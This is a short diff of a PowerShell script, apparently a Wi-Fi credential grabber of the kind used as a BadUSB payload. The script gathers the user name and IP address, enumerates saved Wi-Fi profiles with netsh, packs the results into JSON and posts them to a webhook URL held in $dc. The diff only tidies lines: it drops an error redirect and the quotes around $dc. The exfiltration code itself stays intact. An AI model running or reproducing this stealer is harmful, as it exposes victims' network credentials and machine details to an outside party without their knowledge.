@@ -1,7 +1,6 @@
 # Get user name and ip
 $user = $env:USERNAME
 $ip = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString
-Write-Error > error.txt
 
 $wifiProfiles = netsh wlan show profiles |
                 Select-String -Pattern ":" |
@@ -40,8 +39,7 @@ $jsonBody = @{
     )
     
 } | ConvertTo-Json
-
-$hookurl = "$dc"
+$hookurl = $dc
 
 Invoke-RestMethod -Uri $hookurl -Method Post -Body $jsonBody -ContentType "application/json" 
 
